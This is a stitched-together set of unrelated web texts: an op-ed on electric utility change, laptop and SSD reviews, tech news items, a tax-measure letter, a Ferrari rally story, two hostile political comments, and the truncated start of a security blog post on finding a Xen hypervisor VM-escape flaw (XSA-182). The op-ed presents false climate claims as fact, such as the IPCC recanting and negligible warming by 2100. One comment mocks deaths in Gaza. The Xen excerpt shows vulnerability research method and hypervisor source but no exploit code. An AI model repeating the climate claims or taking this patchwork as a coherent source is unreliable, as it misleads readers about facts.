outcome of all the rapid (i.e., revolutionary or "transformational") changes I saw were either a fade to failure that eventually yielded back to tried and true methods, or a persistent but regrettable and clumsy bolt-on to existing methods that just added unhelpful layers of complexity and bureaucracy. The pace of harmful change was at its peak under Rumsfeld and his vision for "transformation." I was at the epicenter of this mostly pointless churn working in the aptly titled Joint Transformation Division of the Joint Staff. The pearls of genuine wisdom and value that did come along on occasion during my career, such as some of the principals embedded within Deming's TQM, were generally not applied with the understanding or discipline necessary to take root and bear fruit before moving on to the next fad. I have come to the opinion that change for change's sake is one of the most self-destructive activities there is, and we often do more harm to ourselves with misguided change than our worst enemies could hope to inflict upon us by design. A long view of history shows that much of the change is cyclic, as we chase what we think are new ideas that are really old ideas that have simply slipped from the collective consciousness in a generational turnover. Leaders who don't know history are suckers for the snake oil salesmen peddling their proprietary/best-selling version of the next coming revolution or transformation. The great Prussian military theorist Carl von Clausewitz was careful to distinguish between the changing character of war and the unchanging nature of war. The character of war may change with new technologies and environments (e.g., aircraft, submarines, missiles, robots, outer space, cyberspace, etc.), but the nature of warfare remains the same -- a lethal competition between humans governed by passion, reason, and chance. Similarly, while the electric power utility industry may change in character with technology (DG, storage, HVDC, microgrids, EVs, etc.), the nature remains the same: a second-by-second operational balancing act of interconnected generation and load, and a year-by-year balancing act of apportioning capital investment among the four competing mandates of accessible, reliable, affordable, and safe electric power. Resources are finite and needs are infinite. We should not overspend on one mandate to the detriment of the others or to the detriment of grid stability. Energy sector leaders who know their energy history recognize that wind and solar and hydro and biofuels and electricity storage are all ancient technologies that long predate the first power grid. They know that each technology has a painfully slow evolutionary arc when measured by actual, large-scale, un-subsidized economic performance of fielded hardware, rather than measured by peak performance in laboratory conditions at pilot scale, or measured by popularity during cyclic waves of partisan political ideology propaganda and public sentiment. In military studies, we found that it was often economists rather than generals who were the best predictors of revolutions in the character of warfare. For example, economist Ivan Bloch predicted the machine gun and artillery shell-saturated no-man's land of World War I, and its escalation to a nation-state industrial duel, while the generals at the military academies of France and England were teaching that the next war would be won by cavalry charges and bayonets and moral courage. Economics is largely a black box science in that it illuminates trends and tipping points more than it explains the why behind them. But we should look for substantial empirical evidence and durable trends rather than relying on simplistic theories based on only a handful of favored variables and manipulated data points (i.e., incipient ice age predictions of the 1970s, global warming predictions of the 1990s, hurricane swarm predictions following 2005-2006). And the best leaders know their craft well enough to know the absolute limits of what is possible and what is not (i.e., the boundaries of physics and human performance) so as not to be duped by snake oil salesman. The advocates of early adoption will claim the time to change is when the new thing is just marginally better than the old. This ignores the economies of integration and optimization that are disrupted by change. Change has a cost. The real time to change is when the new thing is mature enough to be well-understood and the advantages can be calculated with some assurance to be large enough to make a sound business case for enduring the cost of the transition. So what do the empirical evidence and the economic trend lines indicate for the USA? - Wind: annual capital investment peaked in 2009 and is declining year on year. Capacity factors of new terrestrial installs are the same as older installs despite larger turbine size due to less optimal siting (i.e., declining WRI). Capital cost and O&M of offshore remains daunting, as does environmental opposition. Combined with increasing need for recapitalization of older turbines, these trends argue for a not too distant plateau in capacity. - Hydro: over 1,000 dams dynamited in the past 20 years. New initiatives to power unpowered dams offset by ongoing efforts to restore rivers. Environmental opposition likely to thwart new projects. No significant change in capacity likely. - Solar: Have transitioned from phase of exponential growth to linear growth. Rooftop solar market growth has peaked and is declining. Same is now happening to community solar. Market of credit-worthy homeowners with suitable rooftops and desire for this lifestyle choice is largely tapped out. Creative financing and leasing schemes for non-home owners are also hitting saturation. Additional state funding to put solar or roofs of poor faces subsidy fatigue. Utility-scale is now a long-term buyers' market in PPA pricing and will sustain the bulk of solar growth through the end of the ITC. Then expect a plateau in capacity. - Nuclear: Small oscillations in U.S. capacity ongoing during an extended period of recapitalization. No evidence of a renaissance that will displace other generation capacity in USA. However, capacity will continue to grow in the developing world, and there is likely to be a growing diversity of technologies and fuel cycles. This will be a regulatory and proliferation challenge. - Natural gas: The glut that began in 2012, but was not popularly recognized until 2014, will continue beyond 2020. Supply is extremely elastic and small changes in price will bring quick adjustments in supply, and quick price corrections. The price volatility that remains will be due to unpredictable speculation and conflict, not significant swings in market fundamentals. U.S. will continue to enjoy a price trough compared to rest of the world. Low natural gas prices support continuing trend of onshoring of energy-intensive business, particularly those suitable to automation and robotic manufacturing rather than needing large labor forces. Pipeline infrasture will be limiting factor for electric utilities. - Coal: Not likely to recover much in the U.S. due to cheap NG. However, coal remains the fastest, cheapest, and most reliable way to bring urban-scale electricity to the billions in the developing world who are underserved. Coal will continue its trajectory as the fastest growing fuel for global electricity generation, particularly in India, Indonesia, Malaysia, and Africa. (China's economic growth rate peak is permanently behind it due to demographics. Coal and other energy consumption is currently languishing as they are in recession, but energy consumption growth rate will never return to what it was between 2000 and 2010). - Biofuels: Slow fade to end with a whimper. Liquid biofuels now recognized by national academies and environmentalists and humanitarian agencies as not clean, not green, not sustainable, increasing GHG emissions, damaging the enviroment, increasing fuel costs, and competing with food agriculture regardless of feedstock. Lobbyists losing traction as price remains at a premium to refined petroleum, bulk of production still coming from food crops, and the remainder coming from GMO versions of weeds and invasive species. Doomed by poor EROI due to physical limitations of photosynthesis and thermodynamic losses in converting carbohydrates to hydrocarbons. Abengoa, Dupont, Poet all have quarter million dollar cellulosic ethanol refineries that are about to go the way of Cello, Range Fuels, and KiOR. E10 will not survive the eventual repeal of RFS. Expect power industry to continue low levels of co-firing with cheap wood harvest and mill waste. - Electric Vehicles: U.S. EV sales growth peaked in 2013 and has been declining year on year since. Despite the hype, EV performance lags coventional cars. Tesla S85 propulsion system generates half the horsepower per pound and has half the range per pound of the gasoline propulsion system of a Ford Mustang GT. But the Tesla costs 3 times as much and takes 50 times longer to refuel. Lifecycle GHG emissions of a Tesla are the same as a Jeep Grand Cherokee, particularly attributable to battery fabrication and disposal. We are fast approaching market saturation for EVs, and this will not change without a battery breakthrough. - Storage: Continued incremental progress, but no revolutionary breakthrough that the public will embrace (real progress would require shift to nuclear rather than chemical energy storage). Electrons are real; bits are virtual. Moore's Law is a description of how we have progressed in shrinking the amount of concrete macro stuff it takes to represent and handle a virtual abstract entity of zero size and mass. Electrons stubbornly have fixed mass and size, and cannot be shrunk or substituted. Moore's Law does not apply to electricity (nor to anything but computing, despite claims from some futurists and snake oil salesmen). What storage progress does occur will favor coal and nuclear baseload generation as much as intermittent wind and solar, as it enables both to become load-following. Expect advancement beyond LiON performance only to be implemented at utility scale in dedicated plants and substations due to exotic technology, toxicity, and explosive energy danger. - Climate: Evidence is that warming and melting is not proceeding as originally forecast. 2013 IPCC scientific report recanted almost all the alarmism of the 2007 IPCC report, but White House and pundits vested in alarmism continue to quote from the 2007 report and use the invalidated warming coefficients that predict 2 degrees by the end of the century. Current data supports 0.1 to 0.2 degrees by end of century, which is actually net beneficial to humans and the planet. The Sun is currently in a near record drought of sunspots, and many solar scientists are predicting a reduction in total solar irradiance, and particularly in the solar wind the ultraviolet spectrum that affects upper level cloud formation. Some see this as a long phase that will last until 2050, and that may overpower CO2 effects with a cooling trend similar to the Maunder Minimum of a couple centuries ago. In any case, the data is that sea level rise is not accelerating from the rate it has been for thousands of year, the oceans remain firmly alkaline (pH of 8.0), global sea ice coverage is unchanged from what is was when satellites starting measuring in 1973, hurricanes and severe weather are not increasing (the USA has been in a hurricane drought since 2006), beneficial terrestrial precipitation is slightly increased but flooding is not (drought-ravaged Ethiopia is now getting rain), the U.S. drought index is unchanged from 2000 to 2015, the total acreage burned by wildfires is the same today as it was in 1960 but the number of fires is lower, the IPCC and NOAA agree that the weather in the 20th century was milder than the weather in the preceding five centuries based on statistical and archaeological evidence of storm landfall, floods, and fires. Bottom line: while weather remains a violent force on the planet that we must respect and engineer against, there is no evidence that it is becoming more violent. However, we have greatly increased our exposure to severe weather by adding huge amounts of population and capital to vulnerable coastlines and flood basins. Thus our damages from extreme weather events are likely to rise, even though human casualty rates have decreased by multiple orders of magnitude over the past century due to improved warning, evacuation, and medical attention. In summary, I currently see the U.S. electric utility industry suffering from the same uncritical infatuation with change that I experienced in the military. We have been decreasing our power grid resilience by decommissioning dispatchable coal and nuclear power plants, adding natural gas plants without the commensurate pipeline capacity, and forcing must-take intermittent generation onto the grid. We have also been increasing energy poverty by a spending spree on duplicative and low capacity factor generation and transmission during a time of negligible load growth, and this has raised national retail power rates faster than inflation since 2005. Most AMI installations to date, while bringing some significant advantages to both providers and consumers, would likely not pass a business case test for basic payback -- especially those installed by early adopters without remote cutout capability and not taking full advantage of pre-pay rates and big data for maintenance and theft. If this technology was a great efficiency boon and money saver, why are we charging opt-out fees instead of giving opt-in credits? I see plenty of examples of good change, but it is typically evolutionary, not revolutionary. Labor reducing machines like bucket trucks and digger derricks. Growing safety culture and PPE improvements. Lightning-resistant transformers. Telemetry and SCADA. Improved field communications and operations centers. 811 and better coordination with other utilities and municipal services. Better ROW maintenance. But there is no killer technology or app that offers revolutionary improvement in SAIDI or CAIDI or ROI or consumer satisfaction or other objective metrics. And some things remain virtually unchanged over the past century because they are still the optimal solution for balancing the mandates. We have alternatives to wooden poles and bare conductor, but these remain in widespread use today because they are efficient and effective means to accomplish the mission in many situations. Most change is evolutionary, not revolutionary. Most things that appear new have come around before. Change is costly. Like most things in life, direction and timing are critical. The early bird may get the worm, but the second mouse gets the cheese. Good change requires good leadership. reply Log In or Register to post comments Post new comment Name: Sign In or register to use your TDWorld ID Email: Your comment: * Related Articles ComEd Smart Grid Program Supported 2800 Jobs in Third Quarter Top 5 Smart Grid Trends From 2013 to Watch in 2014 FPL Unveils New Smart Grid Technology Center 2 AEP Ohio Files To Expand Smart Grid Technologies Union City Electric Harvests AMI Benefits Advertisement Featured Video The changing role of HVDC in the U.S. HVDC is making it possible for utilities in the US to accomplish many goals.

Price $499 AUD > Pricing info Specs Dual-core 1.6GHz Intel Celeron N3050 processor • 2GB RAM • 32GB storage • 11.6in 1,366 x 768 screen • 802.11ac Wi-Fi • Bluetooth 4 • USB 3 • USB 2 • HDMI • microSD card reader • Windows 10 Home • 1yr C&R warranty • 292 x 196 x 18.5mm (WDH) • 1.18kg Tweet Email this Print this Feedback It’s cheap and brash – and it knows it. Despite our qualms over the screen, this is a tempting first laptop. The Dell Inspiron 11 3000 has two eye-catching features. First is the price: $499 is phenomenally low for a Windows 10 laptop. Second is its colour scheme: you wonder if there’s any “Tango Red” left in Dell’s paint factory, such is the punch of its plastic lid. If it screams too much for your taste, fear not; blue and white finishes are also available.  Considering that price, it’s surprisingly well put together. The edges are nicely rounded, and it feels as though it would survive a few knocks in a backpack. At 18.5mm thick and around 1.2kg, you could also carry it around without undue strain. It’s less brilliant when it comes to long periods of working, however. The keyboard’s chiclet keys are of a reasonable size, but their travel and key action isn’t the most comfortable.  The touchpad is a decent size considering the laptop’s tiny chassis, and it’s precise in use. The integrated mouse buttons work well, too, and you can adjust the touchpad’s sensitivity using Dell’s pre-installed software. You can even configure multitouch gestures should you wish. Intel’s dual-core 1.6GHz Celeron N3050 processor sits inside, which is a popular choice for budget laptops. It’s paired with 2GB of RAM and 32GB of eMMC storage, so you won’t be surprised to hear this isn’t a system for strenuous video editing. Indeed, it isn’t a combination that can cope with our new benchmarks: we ran our older tests instead, where it scored 0.3 overall. By comparison, the HP Stream 11 scored 0.4. However, the Dell is more than capable of handling basic tasks such as checking email, browsing the internet and working on the occasional document. It begins to struggle if you attempt too many tasks simultaneously, a reflection of its limited memory and processor. Open too many browser tabs and applications and you’ll experience a noticeable slowdown.  The limited storage space is another area you’ll need to work around: with Windows 10 installed, there’s only around 11GB of usable storage remaining. Fortunately, there is a microSD slot. For once, this is preferable to the full-size SD card slots on other budget laptops, since these often leave the card protruding out of the side, which isn’t ideal if you want to leave them in permanently. Battery life was reasonable at 5hrs 50mins of video playback. This was with the screen set to our standard brightness measurement of 170cd/m2, which is perfectly usable indoors. Under more general use with reduced brightness, you can just about eke out enough battery life to get you through a day (Dell claims nine hours of life). There’s a pair of stereo speakers above the keyboard and these provide a surprising amount of volume. With a bright, tinny sound, they’re fine for watching films and making Skype calls, but little more.  Now we come to the weakest part of the Inspiron: the display. The 1,366 x 768 resolution is typical of laptops at this price, but viewing angles are atrocious, especially on the vertical plane. So much so that, with a solid colour on-screen, the only way to erase any evidence of colour cast is to tilt the screen back as far as the hinge allows, and then lift the front of the laptop up by an inch to tip it back further. The display lacks contrast, too, with a pitiful ratio of 203:1. This is caused by its high black levels of 1.32cd/m2, which make solid blacks appear positively grey. Colour accuracy of 57.8% sRGB is also pretty poor, but at least the maximum brightness of 267cd/m2 is reasonable. The other saving grace is the screen’s matte coating. Despite these weaknesses, the Inspiron 11 would make a great first laptop. It’s solid enough that it won’t break at the first knock, the bold design is appealing, and it’s cheap enough that we can forgive that screen. Before you buy, though, take note of the HP Stream 11, which also has a fun design but a much better display.

Unfortunately, it seems that the Peak took feeling the burn to a whole new level. Numerous users reported receiving burns to their wrists after their Basis Peak started overheating. An investigation revealed that the culprit was actually one of the Peak’s most distinguishing features: its highly-accurate heart rate monitor. The Basis Peak had a lot of fans in fitness circles, and its heart rate tracking was one of the big reasons why it did. The signature green glow from the LEDs on the Peak’s underside helped it take those readings… and also helped push temperatures in the watch to skin-blistering levels. That little fireball icon… now seems eerily prophetic How bad is it really? Intel’s announcement says that only 0.2% of Peak owners have actually reported injuries. The defect, however, could impact any watch that the company made between August 2014 and July 2015. The situation is serious enough that Intel — who purchased Basis in 2014 for $100 million — doesn’t want to take any chances. They’ve issued a recall for pretty much every Basis Peak ever sold and are even urging owners of older models that don’t have this particular fault to return those, too. Intel is also issuing full refunds, and not just for the Basis Peak. Any first-party accessories — such as charging docks and extra watch bands — that owners purchased to complement their Peak can be sent back as well.

Tech Tips 101 Mac OSX, applications, Apple hardware & internet tech talk Home Tech Tips OSX Freeware Hardware Garageband Great Mac OSX Freeware – Games – First Person Shooters – HaloMD HaloMD for OSX is, frankly, phenomenal. For a freeware demo: Halo is packed with features, and is well worth a look. HaloMD – a demo version of Microsoft’s all-star HALO – is available for OSX, and includes separate installers for legacy systems (10.5 & 10.6 Intel). HaloMD includes single- and multiplayer gaming: including a single campaign scenario that can be played either single- or multi-player mode. Only the campaign scenario includes full AI bots: all other maps are designed for human-players only. The internet community has contributed a wide variety of mods: which download and install smoothly using the in-game menus. The mods provide additional Halo content: maps, weapons, and vehicles. (Try the Star Wars mod for example.) Editing Halo maps is not for the faint-hearted: however, map tools and tutorials are covered in the relevant forum. HaloMD compares surprisingly well with other available freeware OSX FPS: notably Nexuiz and Xonotic. The single campaign scenario included provides hours of gameplay by itself: why wait?

MSPU Windows Phone Windows 10 Surface Xbox Enterprise Tip us Settings Text Input: Windows 10 Windows Phone Surface Xbox Enterprise Settings Tip us Forum Text Input: Microsoft exec thinks Apple is ‘doing customers disservice with old tech’ 2 by Greg Jordan  @solo_g06 Aug 6, 2016 at 21:14 GMT4 months ago With rumors of a Surface Pro 5 and a Surface Book 2 on the horizon, Microsoft seems to be adamant about keeping its customers updated with the latest and greatest, with yearly iterations of the original Surface Pro since 2013, and some variants as well. While Redmond fans get to look forward to new tech every year (at least in the PC division), what about those dedicated to Cupertino? It seems as though Apple has been lacking when it comes to innovation, let one Microsoft exec tell it. Brian Hall, general manager of Microsoft’s Surface line, had this to say about his long time competitor: I compete with Apple and respect them. but they ARE doing their customers a disservice at times with old tech… https://t.co/PR2pC6TsJh — Brian Hall (@IsForAt) August 5, 2016 Now Apple does have a slightly diverse product line, with PCs, Macbooks, iPads, and iPhones, but lest we forget, the MacBook Air was last redesigned six years ago, and the MacBook Pro’s design hasn’t changed since 2012. In addition, many of the Macs have not been updated with the latest processors, which may be why Apple’s computer shipments declined 11.5% annually last quarter. However, there are rumors which suggest a new MacBook Pro with a new touchscreen keyboard and the latest and greatest Intel chips will be coming this fall, but i wouldn’t get my hopes up. While Apple has yet to respond, it has just released an ad for the iPad Pro, touting it as more than a tablet, more like a computer. While I can’t say I agree with this, the ad is very impressive, and would probably make due for another piece of hardware. Some links in the article may not be viewable as you are using an AdBlocker.

Steve Dent , @stevetdent 08.02.16 in Politics Comments 1144 Shares Share Tweet Share Save The US Federal Aviation Authority (FAA) has been very cautious about drone testing in the US so far, but that's about to change. The FAA has granted Google's sister X division (under Alphabet) permission to test Project Wing delivery services below 400 feet at six sanctioned test sites, according to the White House. The flights will be part of a new push by the US National Science Foundation, which is spending over $35 million on unmanned aerial vehicle (UAV) research and testing over the next five years Alphabet's Project Wing UAVs, first revealed in 2014, aren't like Amazon's drones -- they take off vertically then fly like a fixed-wing plane. While not as maneuverable as standard UAVs, they can fly much farther and carry more weight (see the video, below). Though the FAA released its final rules for drone operations in June, deliveries still aren't allowed. However, Alphabet has reportedly been testing them in the US anyway, skirting the regulations via a NASA waiver. It plans to launch the service commercially in 2017. Alphabet will be able to test drones with cargo beyond line-of-site, which is another current no-no by FAA rules. It will also "develop and deploy an open-interface, airspace management solution for safe low-altitude operations," according to the Feds. The initiatives were unveiled during a big event today that included keynotes from US Chief Technology Office Megan Smith, FAA Administrator Michael Huerta and Intel CEO Bryan Krzanich. The White House emphasized that government must be more flexible about allowing companies to test drones and other tech over US soil. Amazon, for one, was forced it to test its delivery drones in the UK due to restrictive US rules.Drones helped Fort McMurray firefighters, but they can hinder manned aircraft. (Chris Wattie/Reuters) The White House also unveiled a flurry of other initiatives. It wants the FAA to develop new regulations to "safely integrate [UAVs] in the airspace" and have them ready for comment by winter 2016. Further to that, it will create a UAV "safety team" that can analyze safety data and investigate accidents. It also enlisted NASA to help develop "detect and avoid" tech, with completion planned by 2020. FAA chief Huerta cited rescue operations and crop dusting as two big areas where drones could assist or replace manned aircraft. "Just last week, two people were killed in two different accidents involving crop dusters -– exactly the type of job a small unmanned aircraft could do with much less risk to people and property on the ground," he said. There are other studies planned around wildfire safety, drone racing, medical deliveries in hard-to-reach areas, public information about drones and more. For a complete list of the many, many initiatives, check the fact sheet.

With the jaw-dropping Spectre 13, touted as the world's thinnest laptop ever, global computer and laptop giant HP Inc has surged ahead in the race to go thin in the premium segment. It is not a question of just being thin. The laptop has some top-of-the-line specifications for a powerful experience and gives its nearest rivals -- Apple MacBook Pro and Microsoft Surface Pro4 -- a run for their money. After using it for over a week, we can confidently say that it has been a never-before experience. Be it design, performance or portability, the machine leaves every other laptop in the premium segment miles behind. Let's decode it further. Spectre 13 has a hand-polished, jewellery-like finish and a copper-coloured "piston hinge" that creates the illusion of a hinge-less design to offer an unmatched premium look-and-feel. HP Inc claims that its innovative hybrid battery -- split into two thinner pieces -- delivers the same wattage as a single battery for up to 9 hours 45 minutes of charge. Well, for us, continuous use -- movie watching, video gaming and internet browsing -- gave a cool 4-5 hours of battery life. Thin as an AAA- battery at just 10.4 mm with 13.3-inch edge-to-edge display, the Spectre 13 is equipped with sixth generation Intel Core i5 and i7 processors, 8GB RAM and a unique hyperbaric cooling technology. (Our review unit had the i7 processor.) The technology helps the device to draw cool air and direct it over the processor rather than just venting heat out, thus keeping the device cool even with peak performance. And we did not hear the sound of the fan much during use. The device has a carbon fibre bottom that is both durable and lightweight, keeping the total weight of the notebook at just 1.1 kg. Packed with Windows 10 Pro, Spectre 13 uses Intel's integrated HD 520 GPU for graphics and packs in a lightning fast PCIe solid-state drive (SSD) with storage of 512GB with up to 8GB of memory. The device has full HD IPS Corning Gorilla Glass 4 display, a full-sized backlit keyboard, a superb touchpad, a wireless Bluetooth mouse and Bang & Olufsen audio with Quad speakers for superb-quality sound. You do not need an extra set of speakers at all! Another disruptive feature: three full-function USB Type-C connectors with two of these supporting Thunderbolt 3 connectivity to provide a fast and versatile video/data connection including 4K display (via an optional dock). You can charge the laptop with any of the three USB Type-C connectors and all three ports can charge external devices like your smartphone too. When you hold the Spectre 13 in its specially-designed leather case, it appears as if you are carrying a folder with a thin sheaf of papers. For people on the go, it is a clear choice. What doesn't work. Well, try finding for yourself! In the premium segment, this is truly a technology marvel. Conclusion: If we were to describe Spectre 13 in one sentence, it will be, "Style and luxury with powerful performance". The revised price in India for Spectre 13 with the i5 processor is Rs 99,990; and with the i7 it is Rs 139,990 (taxes extra). Both units are now available for purchase.

We now know that they’ll come in sizes up to a terabyte and will offer some rather impressive performance, especially considering this is Plextor’s first attempt at the flourishing SSD standard. The new drives represent Plextor’s big return to the enthusiast market, after a delay with Marvell controllers led to an absence of high-end Plextor consumer hardware for about two years. When these ones arrive, they will come in 12 distinct flavors, varying in storage sizes and physical dimensions, and with slight changes in performance. All of them make use of the Marvel 88SS1093 Eldora controller, according to Tom’s. There are three configurations, offering a drive with a large, branded heatsink, a full-size PCB with no shroud whatsoever, or a similarly nude drive at half height. Regardless of the form factor you opt for, there are sizing options ranging from 128GB, through 256GB and 512GB, right up the largest 1TB variant. Related: Intel confirms 2016 arrival of 3D XPoint-based Optane SSD All drives make use of Toshiba-branded 15 nanometer MLC flash memory and feature three-year warranties. Performance ranges widely, with the 128GB model offering sequential read/write rates of 1,600MBps/500MBps, respectively, while the 1TB variant can reach much higher sustained read/write rates of 2,500MBps and 1,400MBps. The same can be said for the random read and write commands, with the midrange 256GB option offering 210,000 and 230,000 IOPS, respectively, while the 1TB version can handle 280,000/240,000. With the added capacity and performance, you do have to pay a premium. While the 128GB drive will set you back just $90, the 1TB costs a much heftier $600. Adding the heatsink does tack an extra $10 ($50 for the 1TB version) on to the design, but considering it should help improve the life span of the memory chips used in the drive’s design, it’s probably worth it.

It is a measure written behind closed doors by, and for, public employees and their unions, unencumbered by the democratic process and without any meaningful public input. It is an enormous new tax on business, not on profits but on sales. And no, it does not just apply to out-of-state businesses. It applies to any large corporation. Think Nike, Intel, Precision Cast Parts and even locally owned grocery chains and breweries. The measure contains no exceptions for high-revenue, low-margin businesses such as grocery chains. Why should Market of Choice continue expanding if virtually all of its profits are taken by this tax? This measure is shocking in its scope — a $3 billion tax increase just at a time when Oregon is finally experiencing a robust recovery from the recession. This measure will hurt the Oregon economy in ways that cannot yet be predicted. Nothing like this should ever receive the light of day via the initiative process, which long ago was hijacked by special interests. I’m voting no.

But the real purpose of the trip, which cost participants $5,000 each through donations or sponsorships, was to raise money for the Prancing Ponies Foundation, a nonprofit benefiting underprivileged high school girls. Their route on the three-day rally, which began at the Fairmont Hotel, took them through downtown to Interstate 280 and south on Highway 1, a roughly 350-mile leg they are to repeat in reverse when returning Sunday. The high-performance cars outside the hotel drew dozens off gawkers who snapped photos and took videos to capture the earsplitting sounds of the engines. “We are creating women leaders one girl at a time by raising funds to send them abroad to help them develop their self-esteem and self-confidence so that someday they are leaders and can own and race their own Ferraris,” said Chanterria McGilbra, a North Bay pharmaceutical executive who created the foundation and organized the rally. McGilbra bought her first Ferrari last year with stock options from work and credited her experience abroad — earning a master’s degree in business from the International University of Monaco in 2007 — with improving her self-confidence. “I’d given up my apartment, my job and sold my car,” she said. “I had nowhere to go backwards to — moving forward was key. That’s where most of the psychological work begins and ends for these girls going abroad.” Novato pharmaceutical exec Chanterria McGilbra and a dozen other women gun their engines in whatâs said to be the first all-female Ferrari rally held in the U.S. It will support McGilbraâs nonprofit, Prancing Ponies. Media: Carolyne Zinko / San Francisco Chronicle The world of Ferrari is chummy; owners who buy from any of the 37 dealers in the United States meet one another at car shows or any of the five rallies held in the U.S. each year. About 2,640 Ferraris — six models ranging from $198,000 to $485,000, not including the limited edition LaFerrari — were sold in North America last year, according to Krista Florin, a corporate spokeswoman, but few of the owners are women. Even fewer of them engage in amateur racing in their Ferraris, and McGilbra is one of them. She calls racing “meditative,” noting, “It’s just me, the car and the next turn. McGilbra reached out to a few female owners she knew, including fellow amateur racer Christine Sloss, wife of Google exec Benjamin Sloss. A Ferrari concierge put McGilbra in touch with Gabriela Forte, whose husband is president of Vita Forte Inc., an organic and super-food manufacturer. Instead of pledging her sponsorship money to Prancing Ponies, Forte was allowed to direct it to the Mid-Coast Fire Brigade, which has been fighting the huge fire in Big Sur. Other participants included Agne Christensen, an artist and creator of the Seek Fine Art app; Colleen Costello, a mother of two teens; Hayley Melidonis, a manager at Intel Corp.; and an interior designer and contractor specializing in tech real estate who identified herself only as Susan D.

Secret pleasures of summer, campy to classic Lorraine Rominger’s memoir of farm life, “Rangity Tango Kids” History of dating from a feminist’s viewpoint Costello and Susan D., it should be noted, drove Lamborghinis, not Ferraris. Costello said her vintage Ferrari was not up to a long road trip, while Susan D. said upping the mileage on her Ferrari would decrease its value. Her 2016 Lamborghini Aventador Superveloce was a limited-edition model, with a sticker proving it was the first of 600 made. “I am doing this because I wanted to inspire young ladies that they can dream big and they can achieve it,” she said. “They can be successful, dream, and they can write their own checks.” Onlookers gawked at the cars lined up in front of the Fairmont Hotel, the rally’s starting point. As the drivers hit the road, they also had to keep their urges in check. “Hey!” a man shouted through the open window of his tiny Smart car, pulling up alongside McGilbra on the Embarcadero. “Wanna race?” She burst out laughing and revved her engine with a playful “Vroom! Vroom!” Carolyne Zinko is a San Francisco Chronicle staff writer.

Mmmmm. At least they are not dropping them on hospitals. Obama is a pathological liar, and sooner he goes the better. Long live Syria and Iran.

I haven’t checked out Presstv for ages, has something changed?. Have they got a new manager or something ?. I used to like their site, especially when they showed the last two Gaza turkey shoots live on air. hopefully they will get back on the ball. But truth be told, it was one of Gordon’s op-ed’s on Presstv that made me discover V.T. And no praise i could give to you guys and girls would do your site justice.

Quarkslab's blog Android Challenge Cryptography Development Exploitation Fuzzing Life at Quarkslab Archives social atom feed twitter github Categories Android Challenge Cryptography Development Exploitation Fuzzing Life at Quarkslab Maths PenTest Program Analysis Programming ReverseEngineering Software Tags Xen exploitation part 3: XSA-182, Qubes escape Date Thu 04 August 2016 By Jérémie Boutoille Gabriel Campana Category Exploitation. Tags Xen Exploitation PoC guest-to-host vm escape qubesos This is the last part of our blogpost series about Xen security [1] [2]. This time we write about a vulnerability we found (XSA-182) [0] (CVE-2016-6258) and his exploitation on Qubes OS [3] project. We first explain the methodology used to find the vulnerability and then the exploitation specificity on Qubes OS. We would like to emphasize that the vulnerability is not in the code of Qubes OS. But since Qubes OS relies on Xen hypervisor, it is affected by this vulnerability. More information is provided by Qubes' security bulletin #24 [8]. tl;dr This screenshot shows a fresh install of Qubes OS. The terminal is running inside an untrusted VM to which an attacker gained access. The exploitation of the vulnerability gave him full control over dom0. Thanks to a little shell script, he can execute any command in dom0 (as shown by the gray borders and the title [Dom0] Calculator of xcalc), and thus gain access to other VMs as well. For instance, qvm-run work xcalc launched the xcalc command in the work VM. Finding the vulnerability After writing the exploit of XSA-148 [2], we were curious about the internals of the memory management of paravirtualized guests. Because a PV guest kernel runs in ring 3, every privileged operation have to be done through hypercalls. Xen must be able to emulate some mechanisms in order to maintain the kernel inside ring 3. With paravirtualization, jumping from ring 3 to ring 0 rhymes with VM-escape. GDT example Let's take an interesting example: the Global Descriptor Table (GDT). The GDT contains information about memory segments, but can also contain call-gates, trap-gates, task switch segments (TSS) and task gates. These mechanisms allow privilege switching. Some of them are quite complex and then should be rigorously validated at every GDT's update. Each page used as a GDT entry is passed to the function alloc_segdesc_page which calls check_descriptor on each entry. Even if this function is not long, no statement is superfluous: /* Returns TRUE if given descriptor is valid for GDT or LDT. */
int check_descriptor(const struct domain *dom, struct desc_struct *d)
{
    u32 a = d->a, b = d->b;
    u16 cs;
    unsigned int dpl;

    /* A not-present descriptor will always fault, so is safe. */
    if ( !(b & _SEGMENT_P) )
        goto good;

    /* Check and fix up the DPL. */
    dpl = (b >> 13) & 3;
    __fixup_guest_selector(dom, dpl);
    b = (b & ~_SEGMENT_DPL) | (dpl << 13);

    /* All code and data segments are okay. No base/limit checking. */
    if ( (b & _SEGMENT_S) )
    {
        /* SNIP SNIP SNIP */
        goto good;
    }

    /* Invalid type 0 is harmless. It is used for 2nd half of a call gate. */
    if ( (b & _SEGMENT_TYPE) == 0x000 )
        goto good;

    /* Everything but a call gate is discarded here. */
    if ( (b & _SEGMENT_TYPE) != 0xc00 )
        goto bad;

    /* Validate the target code selector. */
    cs = a >> 16;
    if ( !guest_gate_selector_okay(dom, cs) )
        goto bad;
    /*
     * Force DPL to zero, causing a GP fault with its error code indicating
     * the gate in use, allowing emulation. This is necessary because with
     * native guests (kernel in ring 3) call gates cannot be used directly
     * to transition from user to kernel mode (and whether a gate is used
     * to enter the kernel can only be determined when the gate is being
     * used), and with compat guests call gates cannot be used at all as
     * there are only 64-bit ones.
     * Store the original DPL in the selector's RPL field.
     */
    b &= ~_SEGMENT_DPL;
    cs = (cs & ~3) | dpl;
    a = (a & 0xffffU) | (cs << 16);

    /* Reserved bits must be zero. */
    if ( b & (is_pv_32bit_domain(dom) ? 0xe0 : 0xff) )
        goto bad;

 good:
    d->a = a;
    d->b = b;
    return 1;
 bad:
    return 0;
}
 Diving into this kind of code makes you crazy, and Intel documentation becomes your only friend for understanding every single bit shifting and bit masking. A zealous reader should have noticed in one of the comments of the previous code that call-gates are emulated by forcing the DPL descriptor to zero, causing a general protection fault on usage. Believe me, code emulating call-gates is a nightmare (function emulate_gate_op for the curious reader). Well, since we did not find any vulnerability within GDT management, we gave a look at the page table management. Page table management At the beginning, we worked on fuzzing HYPERVISOR_mmu_update hypercall. The idea is to generate a random page table entry, update the page table, and in case of success, checks if the new mapping is dangerous. So we have to define a list of dangerous mappings, such as: an L1 entry maps another Lx table with USER and RW flags, an L2/L3/L4 entry maps another Lx table with PSE, USER and RW flags, an Ly entry maps another Lx table with USER and RW flags and x != y-1. Before starting fuzzing, we decided to check manually if such mappings could be created. The last one is interesting and must be explained. Let's imagine an L4 entry referencing itself with the RW bit set. By using a special virtual address the L4 becomes writable and every Xen invariant can be bypassed. Xen checks properly if this kind of mapping is done: #define define_get_linear_pagetable(level)                                  \

